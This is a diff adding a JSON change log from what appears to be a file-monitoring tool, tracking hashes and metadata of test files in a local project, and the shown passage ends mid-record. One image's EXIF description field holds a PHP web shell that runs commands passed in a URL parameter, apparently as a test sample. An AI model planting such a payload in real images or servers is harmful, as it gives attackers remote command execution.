@@ -1,0 +1,2822 @@
+{
+  "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\test3.txt": [
+    {
+      "timestamp": 1765358019,
+      "event": "CREATED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "5f5e0a0f589e8974cf197745b10d2d35e45935664869657559a8a514f6f1f7c7",
+      "content_hash": "3fea67e81cd51e15aa57c9438680cef1d21fe6e8c35e355e6f156092f844572a",
+      "filesystem_hash": "12ff17e64b1710cdee6132dd84e7f7b1c09907639d3a08e8781198ebae3b9cce",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 98,
+        "created": 1765280330.8423429,
+        "modified": 1765358019.4014506,
+        "accessed": 1765358019.421448,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765358057,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "a85a6523d705ee6518a5167e46d303e8469b5aec966ffb1dda1ee002f700fe81",
+      "content_hash": "8ac69ae486ff30d01a2eed81bccb21b255fec433972090249d707d9fba518a1a",
+      "filesystem_hash": "463c6bb4561ebcf59b12e65256b84c8a339368e9e86d832cc95304e44ab7b44b",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4227,
+        "created": 1765280330.8423429,
+        "modified": 1765358057.171471,
+        "accessed": 1765358057.1979132,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765358064,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "7fa9d21f8d5c7df76faab9be5511d12e9c62f807cc01a74ecdf053939bde0b5c",
+      "content_hash": "3b22ff9d6329d0c022c7b0088928101d53480d4201f6226ecc10e0a11704b830",
+      "filesystem_hash": "fead5ea1b18545a7a32648c66ae6a09aff00da48d2318a7c782e4c11dfbf2bde",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4226,
+        "created": 1765280330.8423429,
+        "modified": 1765358064.400951,
+        "accessed": 1765358064.4198194,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765358076,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "0753cca9715ecafa41b782affb37f5f87f794fc099a816f942db75035d274994",
+      "content_hash": "e39188294083dfce5380e906c9dbc3552c65ad83060879175a70a07f5a52faa2",
+      "filesystem_hash": "9ec629c017c3c6801aa54890bd02f5bb5bb481b4f561e753fab7a609161ca5da",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4240,
+        "created": 1765280330.8423429,
+        "modified": 1765358076.1507566,
+        "accessed": 1765358076.1762128,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765358097,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "38df0013c84b8ae791b3bf042b477d4f2e62fcc14b4bb2836030cf3a39c097ad",
+      "content_hash": "81cc580d52b369d8f07b52896b899dbd506ac5faeb32b8951834967e3d66b20a",
+      "filesystem_hash": "5227d027f6fe18bededd4288adb5c55f6e35545ac74cfb060d3d4245f76e64e0",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4246,
+        "created": 1765280330.8423429,
+        "modified": 1765358097.9537358,
+        "accessed": 1765358097.9752648,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765358161,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "f4a07018e28c3ec6674a89a038dacd22dca7eb4c32cd1f317a2ab3cd7cb8be2c",
+      "content_hash": "9cbbac40a2f73ec378964c3bf8178b4349da377c25ffd5c9a394a6019605a667",
+      "filesystem_hash": "85c7e188c8b8870222618a57b2d7c909916da42eae116f8c7931b42b75e2f6a3",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4249,
+        "created": 1765280330.8423429,
+        "modified": 1765358161.582274,
+        "accessed": 1765358161.6137288,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765360361,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "c073795658010f0748184d7e097636ab570a61cfe576c4fb3bc133ccc168799e",
+      "content_hash": "616267103bb752dd04bd647708f32f68fb3d78c240f7e278612e3ca543bb4a26",
+      "filesystem_hash": "b1e6a43211db60d8effb4bf75ba4772876876d013e8bcf4d4da8b0e053412a6b",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4250,
+        "created": 1765280330.8423429,
+        "modified": 1765360361.2772312,
+        "accessed": 176536.290957,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765362373,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "6613bfeda482c293315330acba3e419d8101f92ddf4d01f8e268bf5e39e68c37",
+      "content_hash": "d5c050c39a2cd5b98a8af700b11b03ccb8628fdfa5dc289a0885c7baad660136",
+      "filesystem_hash": "cb434f0059854f8c00e0968775ffb3ca20f5bca10108644ccd93871e7d67af1c",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4236,
+        "created": 1765280330.8423429,
+        "modified": 1765362373.4643986,
+        "accessed": 1765362373.4803474,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765363072,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "7a4f3cef47873cf4e51584fd7032a877e857683c9cc5ded1574070288b0f0df9",
+      "content_hash": "2e20db1a3f85b8a535de6fb0a403f9078f2707218214a59fb784800cf3932791",
+      "filesystem_hash": "ed5274616e61603242b93b10a0df256f31529a5970df10a39cc685c1f3167eaa",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4239,
+        "created": 1765280330.8423429,
+        "modified": 1765363072.7469585,
+        "accessed": 1765363072.760672,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765363238,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "f268aaa089e422ad88d104171e17eb45a7f7df8ea81db817d4a3db118863c767",
+      "content_hash": "c0b7db619565816fa84c5c5f7479526e9cb47f993729dcf487c7f9747dbcd948",
+      "filesystem_hash": "1735386860a86944b81ce8959905a1d1693f2b714f98b6e282874dfb9a2560bd",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4240,
+        "created": 1765280330.8423429,
+        "modified": 1765363238.868097,
+        "accessed": 1765363238.8839054,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765364370,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "5c11d136501b7d75a1bf9c0bcc691dfadd04dd86d34ceb335158243de31077e7",
+      "content_hash": "7e4ddecca40f2226c599a380ce0a48e4009523719a0d97ce794adfcfa5273dbf",
+      "filesystem_hash": "3f0314d538cc2c4fd034385358de6e852285d27eb420b76e64d95a5988ef10ac",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4241,
+        "created": 1765280330.8423429,
+        "modified": 1765364363.9965408,
+        "accessed": 1765364370.4665847,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765364376,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "4cd13d54ae35e6ca4282cb1c4c38769f16cbcc826214e716d7a9b530d2e18b4c",
+      "content_hash": "454d03e451169641f02cf65e08e5f0f2b54be8ba5303ac7ee2ec2d75950e60d5",
+      "filesystem_hash": "716426b566455fff7abc6de90a9daf88b81d6191d267282c89fd9a93d87d729b",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4247,
+        "created": 1765280330.8423429,
+        "modified": 1765364376.7413669,
+        "accessed": 1765364376.7720416,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765366567,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "0cafca40a1fa49990e7664b62f07b6a8b78816375d25598bb722831af480ac09",
+      "content_hash": "67a0edeaaa0463038d068d0f02cddf7c896c455bb1076dd0c4aedcbff06a7dbb",
+      "filesystem_hash": "951ab1eb5d59eb59bad9b6325dfac63b204035b6f3366f44ecbec01ba6a6c60a",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4250,
+        "created": 1765280330.8423429,
+        "modified": 1765366567.014053,
+        "accessed": 1765366567.0392141,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765368884,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "3167ffabb5131836e16cbab7c10b49caa7d2cdb05c0978cd4a34b1c6532b671c",
+      "content_hash": "af4fb81754ac53e75bf5a66d63d0c644337acbdbe56c8ae68cec9fed0365f2d8",
+      "filesystem_hash": "15af21f366a7a40d85236ca9b740ccd5c68f48ab529cf47625f6b6d16e815e6a",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4251,
+        "created": 1765280330.8423429,
+        "modified": 1765368884.749446,
+        "accessed": 1765368884.7774243,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765368900,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "2db6a48aa504e52d0628fcdddddb092d9754274090d26ea436ce791851b11492",
+      "content_hash": "d5c050c39a2cd5b98a8af700b11b03ccb8628fdfa5dc289a0885c7baad660136",
+      "filesystem_hash": "b2fe6e7786dc47ad2b3386c6ab631bccd2feb02de095861edf47fce6cc266fd0",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4236,
+        "created": 1765280330.8423429,
+        "modified": 1765368900.3257596,
+        "accessed": 1765368900.3478,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765369465,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "be5fa5878c2e7129c112a5b2588e80d295c5df408b0a3c445180f44dc10df077",
+      "content_hash": "39102093afb78b78928ad370ca6f255b4eba1a1dedf8207199f9fb32cc1d4785",
+      "filesystem_hash": "8b2d8b2b557d556ba68196a2a9f6f316dcad3b5100b82ab24522173a64e08668",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4237,
+        "created": 1765280330.8423429,
+        "modified": 1765369465.0236986,
+        "accessed": 1765369465.0445225,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765380790,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "310465af4a287b0a3aa6f87b789350cf4c1737e7b38d6b95819dccebb8d85811",
+      "content_hash": "98fbf3ae6ce0f00cf7bfca8d40456abfa7acb2e9504a567a5a5ad818da8c1425",
+      "filesystem_hash": "a704cfcc3624d56d90545b885de7eaf923e2c5c0aef64dda484d7f9063f6235b",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4238,
+        "created": 1765280330.8423429,
+        "modified": 1765380790.8873734,
+        "accessed": 1765380790.9163768,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765446553,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "7df14e47c2e3de5254a1208da29d7e205460e80fccef95344cd251f625bb339b",
+      "content_hash": "cdb3f5e959037dc20a6888a6322a7220c3443caac0a1c36f81353a65a95450d0",
+      "filesystem_hash": "03bc8665e7a94ddc1971a2df519d847efd50a5651a385cf0ea57b388231eb4d9",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4247,
+        "created": 1765280330.8423429,
+        "modified": 1765446553.5390613,
+        "accessed": 1765446553.5533683,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765455611,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "41feee2f92834b855ef9ab8c782305b82f3bd6d00c2dce45c817013fa41d13cf",
+      "content_hash": "ab59ca9e9813f387e8d3087515d46565fcd30a8f9286f0af584f4d43e08b734f",
+      "filesystem_hash": "0c82ca5667b20767e5b1e0cab1a221c9f6ce02504a53837346e5e8081ee3d0dd",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4250,
+        "created": 1765280330.8423429,
+        "modified": 1765455611.4076624,
+        "accessed": 1765455611.4211822,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765455619,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "e3738b8174b5f0222781d67b0e7c916202f47ef5526e6aef890b23697ef55a6d",
+      "content_hash": "a95649ae20cb2e8f5e89d900eed52306f0017e7db1d5c37b5e38477c31eda8a6",
+      "filesystem_hash": "9616dc880be8b4a3053c743275d76e2a50337f9e83bb88f493d7de8fcd2f6d99",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12758,
+        "created": 1765280330.8423429,
+        "modified": 1765455619.877978,
+        "accessed": 1765455619.894494,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765457921,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "4f0058aed34b67dffd366d0168987f2dad39d3c42fc6d19ac4459898e301966a",
+      "content_hash": "430a3133c89102dcfc292a73f6e7e18a144204c2ae503cbbb69b98cf57fd1b2f",
+      "filesystem_hash": "a4ed71c071e2806f1f0215e7e758e8b14e8098a32810c87b834b61eeb8ee858f",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12764,
+        "created": 1765280330.8423429,
+        "modified": 1765457921.4427307,
+        "accessed": 1765457921.4569592,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765457936,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "ca45942945380c38a94b0a42bcb2f03efc1101226f1fd4eac44d8e1287be98b9",
+      "content_hash": "0cb1595397422e9ff1e47f5e1692a199d19f3c0d95cb92ceeffdab89025e6d65",
+      "filesystem_hash": "5aea53716c9982f97658e8e1d9e52ad3b8f3b588a022c5659239ed80908e0d54",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12770,
+        "created": 1765280330.8423429,
+        "modified": 1765457936.3248308,
+        "accessed": 1765457936.3378308,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    }
+  ],
+  "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\cat.jpg": [
+    {
+      "timestamp": 1765358153,
+      "event": "CREATED",
+      "file_uid": "766dffaf-1c30-4609-9c16-dc79f66aeb9b",
+      "combined_hash": "eabd2d2dc8ef4cc100fc8d31e250941c6e8b47692c2a23678fef7b39b302b53e",
+      "content_hash": "0e9aab96f66d3f8fdf2103619836532398b253888452b5266f960525ef83f399",
+      "filesystem_hash": "5477883b70d9ce43657c1ce12978f101179a9de518813186b4105ed55967c360",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 31944,
+        "created": 1765281311.5354712,
+        "modified": 1764067242.9801624,
+        "accessed": 1765358153.7439802,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765783340,
+      "event": "DELETED",
+      "file_uid": "766dffaf-1c30-4609-9c16-dc79f66aeb9b",
+      "combined_hash": null,
+      "content_hash": null,
+      "filesystem_hash": null,
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": null,
+      "embedded_metadata": null,
+      "current_user": null,
+      "machine": null
+    }
+  ],
+  "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\cat2.jpg": [
+    {
+      "timestamp": 1765358153,
+      "event": "CREATED",
+      "file_uid": "40b554b9-2d57-48a9-96c1-601c32d3cc25",
+      "combined_hash": "1e51b494d00a11ec7d6889af4ae9c20124a40ac2a102b6e1f6faf44fdb6e504a",
+      "content_hash": "24848086fb589628890dae5ae2bc40428e2215b8a9dd7c98bb3decd149a0e220",
+      "filesystem_hash": "c90ada45a344bae3fc758a22309e2c1452c5c3ebed50d7516a965d8348686340",
+      "embedded_metadata_hash": "2b1f874565e90dcffac21e1d24dab8d392e1efd9b1095e2eef84606974cf0c00",
+      "filesystem_metadata": {
+        "size": 32117,
+        "created": 1765281331.30032,
+        "modified": 1764067929.083979,
+        "accessed": 1765358153.772365,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": {
+        "ResolutionUnit": "1",
+        "ImageDescription": "<?php echo \"Shell\";system\\($_GET\\[\\'cmd\\'\\]\\); ?>",
+        "YCbCrPositioning": "1",
+        "XResolution": "1.0",
+        "YResolution": "1.0"
+      },
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765783340,
+      "event": "DELETED",
+      "file_uid": "40b554b9-2d57-48a9-96c1-601c32d3cc25",
+      "combined_hash": null,
+      "content_hash": null,
+      "filesystem_hash": null,
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": null,
+      "embedded_metadata": null,
+      "current_user": null,
+      "machine": null
+    }
+  ],
+  "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\rename2.txt": [
+    {
+      "timestamp": 1765358153,
+      "event": "CREATED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "595ee88b9873adea97f3dd50b8c38c71c508074bc52d27969843e0df70ec8cf5",
+      "content_hash": "b51d09fcdabb5e12a85632a87d828360753cb398a2be9fa3b9cc601d9a3697a3",
+      "filesystem_hash": "4b198d4a93e28a32cee22b5ff7d4ad807408011cb78d34e2bf6eff618f9b78c4",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 14,
+        "created": 1764400551.8339345,
+        "modified": 1765357274.722691,
+        "accessed": 1765358153.8039775,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765360348,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "5cf0f7b584b66cf47bf03b190dd009f9c84d139b9d5513b6fbe08b5a495d934d",
+      "content_hash": "f274430fa556736602e24bdf9803234099c8b6e7878f70d4035cc7b8c0a206cb",
+      "filesystem_hash": "d8621d00720b2dd9b99e6d8a0473ab1a8e51711f95bcd2694ea9bf5e9e804668",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 15,
+        "created": 1764400551.8339345,
+        "modified": 1765360348.5097303,
+        "accessed": 1765360348.5371773,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765362128,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "b60f2d84a78447050f55957e305db23c88c48cce9a4f51fc0831b947f773f2c7",
+      "content_hash": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
+      "filesystem_hash": "2c5c6d695fd83319343f645884c7494408b865df2dc738f887d4a61989f47eb7",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4,
+        "created": 1764400551.8339345,
+        "modified": 1765362128.9330137,
+        "accessed": 1765362128.9665258,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765364167,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "a5cc492af55fe6166082a57ca78feef9f6681d39958d080123e9aaadce9c9c18",
+      "content_hash": "1b4f0e9851971998e732078544c96b36c3d01cedf7caa332359d6f1d83567014",
+      "filesystem_hash": "a9d442571146e4ac4f42dd5ebf5a90d1bb8dd0f32aac8009af8a7429656ab393",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 5,
+        "created": 1764400551.8339345,
+        "modified": 1765364167.6402833,
+        "accessed": 1765364167.6718714,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765364173,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "7e71177248cc31907fc3407daa03a1aa4cb736d55d4e7b98d4295f65e2acf1aa",
+      "content_hash": "a98ec5c5044800c88e862f007b98d89815fc40ca155d6ce7909530d792e909ce",
+      "filesystem_hash": "e18330b99dd228a739e76ade5de899e44a1bc0906f9e947bf35d1a8ce8a2b53f",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 6,
+        "created": 1764400551.8339345,
+        "modified": 1765364174.0004904,
+        "accessed": 1765364174.0082092,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765364190,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "aa29e6d9e190749cceba9a755baa6e239f5a77d8a5155982b689d28e99bdd37c",
+      "content_hash": "a25621f4864c8c0127dd2772aeb278af0a9ac30822e122d06815d0978c9394d3",
+      "filesystem_hash": "5b69d67f8f21560fc2e7497961a22679a9136ee17432b9f7085fd0501c681fdf",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 7,
+        "created": 1764400551.8339345,
+        "modified": 1765364190.2711272,
+        "accessed": 1765364190.3043487,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765364218,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "81a638a75891e8746d749b1742deec26c8deedabbaab2d8b89050346ad13055a",
+      "content_hash": "02b34377b1645f4573ef80c9c06a9f55435b1fbdbb3771dbd2fe0264993d0995",
+      "filesystem_hash": "88a8b8291d099c97d61b12026f1a3820ba7488d78d44e17d9357f0fe38748497",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 8,
+        "created": 1764400551.8339345,
+        "modified": 1765364218.6338296,
+        "accessed": 1765364218.643597,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765364227,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "b00fd986de1223ad68e94db986e0707405451863819461aa59681e000c4a903c",
+      "content_hash": "fe22eed585dc17eeb202bac01d9fad0fa7617b417afd174d24c49f17da1de710",
+      "filesystem_hash": "c2a799d91be8982da65b5dcfcc0eeadfb964b75714960de9fd6bbd0c4e4fcba8",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 9,
+        "created": 1764400551.8339345,
+        "modified": 1765364227.179922,
+        "accessed": 1765364227.1885314,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765364258,
+      "event": "MODIFIED",
+      "file_uid": "4fd2e9d1-5418-4dfd-84ac-14ca3bcd2403",
+      "combined_hash": "ce2f6fd6bb50713c174220b88c0e483664ae429370263ad0cb481466158b3931",
